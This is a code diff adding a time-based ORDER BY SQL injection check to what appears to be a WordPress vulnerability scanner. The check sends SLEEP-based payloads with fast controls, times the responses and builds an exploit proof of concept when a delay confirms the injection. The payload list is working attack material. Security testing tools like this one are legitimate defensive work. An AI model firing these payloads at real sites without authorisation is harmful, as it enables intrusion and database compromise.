@@ -7053,6 +7053,60 @@ def verify_wordpress_sqli(
             if res.verified:
                 return res  # early exit — ORDER BY fast-path confirmed
 
+            # ORDER BY time-based fast-path: if error-based ORDER BY failed, try SLEEP.
+            # Patterns: col AND SLEEP(5), col,(SELECT 1 FROM (SELECT SLEEP(5))x),
+            # CASE WHEN 1=1 THEN col ELSE (SELECT SLEEP(5)) END.
+            # Always tried BEFORE the generic WHERE time-based path so we don't burn
+            # budget on quote-based payloads that can't work in ORDER BY context.
+            step("[ORDER BY time-based] probando SLEEP en contexto ORDER BY...")
+            _ob_time_pairs = [
+                (f"{_ob_col_prefix} AND SLEEP(5)",
+                 f"{_ob_col_prefix} AND SLEEP(0)"),
+                (f"{_ob_col_prefix} AND (SELECT 1471 FROM (SELECT(SLEEP(5)))x)",
+                 f"{_ob_col_prefix} AND (SELECT 1471 FROM (SELECT(SLEEP(0)))x)"),
+                (f"{_ob_col_prefix},(SELECT 1 FROM (SELECT(SLEEP(5)))x)",
+                 f"{_ob_col_prefix},(SELECT 1 FROM (SELECT(SLEEP(0)))x)"),
+                (f"CASE WHEN 1=1 THEN {_ob_col_prefix} ELSE (SELECT SLEEP(5)) END",
+                 f"CASE WHEN 1=2 THEN {_ob_col_prefix} ELSE (SELECT SLEEP(0)) END"),
+                (f"IF(1=1,{_ob_col_prefix},(SELECT SLEEP(5)))",
+                 f"IF(1=2,{_ob_col_prefix},(SELECT SLEEP(0)))"),
+            ]
+            _ob_time_tried = []
+            for _ob_slow, _ob_fast in _ob_time_pairs:
+                try:
+                    import time as _time_mod
+                    _t0f = _time_mod.time(); send(_ob_fast); _tf = _time_mod.time() - _t0f
+                    _t0s = _time_mod.time(); send(_ob_slow); _ts = _time_mod.time() - _t0s
+                except Exception as _e:
+                    _ob_time_tried.append({"slow": _ob_slow, "fast": _ob_fast, "error": str(_e)})
+                    continue
+                _delayed = (_ts - _tf) >= 3.5
+                _ob_time_tried.append({"slow": _ob_slow, "fast": _ob_fast,
+                                        "slow_s": round(_ts, 2), "fast_s": round(_tf, 2),
+                                        "retraso": _delayed})
+                if _delayed:
+                    res.verified = True; res.ok = True; res.confidence = "confirmed"
+                    res.evidence.update({"tecnica": "orderby-time-based",
+                                         "payload_ganador": _ob_slow,
+                                         "slow_s": round(_ts, 2), "fast_s": round(_tf, 2),
+                                         "ob_timing_intentos": _ob_time_tried})
+                    res.detail = (f"SQLI confirmada (ORDER BY time-based): "
+                                  f"{sqli_param}={_ob_slow!r} tardó {_ts:.2f}s vs "
+                                  f"control {_ob_fast!r} en {_tf:.2f}s")
+                    step(f"VERIFICADO (ORDER BY time-based): {_ts:.2f}s vs {_tf:.2f}s")
+                    _poc_p2 = dict(base_params); _poc_p2[sqli_param] = _ob_slow
+                    res.exploit_poc = _build_exploit_poc(
+                        base_url=boot.base_url, endpoint=endpoint, method=m,
+                        params=_poc_p2, json_body=json_body,
+                        technique="ORDER BY time-based SQLi",
+                        description=(f"ORDER BY time-based SQLi on '{sqli_param}': "
+                                     f"SLEEP(5) in ORDER BY caused {_ts:.2f}s delay. "
+                                     f"Replace TARGET with the real host."))
+                    break
+            res.evidence["ob_timing_intentos"] = _ob_time_tried
+            if res.verified:
+                return res  # ORDER BY time-based confirmed
+
         step("probando error-based (extractvalue/updatexml) para extraer version() real...")
         error_tried = []
         error_found = None
